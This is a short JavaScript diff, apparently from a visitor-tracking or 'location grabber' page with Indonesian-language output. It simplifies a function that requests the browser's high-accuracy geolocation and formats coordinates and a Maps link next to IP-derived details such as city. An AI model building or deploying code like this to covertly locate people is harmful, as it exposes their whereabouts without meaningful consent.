@@ -169,27 +169,12 @@ Kota                : ${ip.city}
 
     const ambilLokasi = () => {
       return new Promise((resolve) => {
-        if (!navigator.permissions || !navigator.permissions.query) {
-          navigator.geolocation.getCurrentPosition(success, error);
-          return;
-        }
-
-        navigator.permissions.query({ name: 'geolocation' }).then(result => {
-          if (result.state === "granted" || result.state === "prompt") {
-            navigator.geolocation.getCurrentPosition(success, error);
-          } else {
-            resolve(`- 〘 𝗟𝚶𝗞𝚫𝗦𝗜 𝗟𝚫𝗡𝗚𝗦𝗨𝗡𝗚 〙 -\n\n❌ Lokasi tidak diizinkan oleh pengguna.`);
-          }
-        });
-
-        function success(pos) {
+        navigator.geolocation.getCurrentPosition(pos => {
           const { latitude, longitude, accuracy } = pos.coords;
           resolve(`౼ 〘 𝗟𝚶𝗞𝚫𝗦𝗜 𝗟𝚫𝗡𝗚𝗦𝗨𝗡𝗚 〙 ౼\n\nLatitude            : ${latitude}\nLongitude           : ${longitude}\nAkurasi             : ±${accuracy} meter\nPeta                : https://maps.google.com/?q=${latitude},${longitude}`);
-        }
-
-        function error() {
+        }, () => {
           resolve(`- 〘 𝗟𝚶𝗞𝚫𝗦𝗜 𝗟𝚫𝗡𝗚𝗦𝗨𝗡𝗚 〙 -\n\n❌ Lokasi tidak diizinkan oleh pengguna.`);
-        }
+        }, { enableHighAccuracy: true, timeout: 7000 });
       });
     };
 
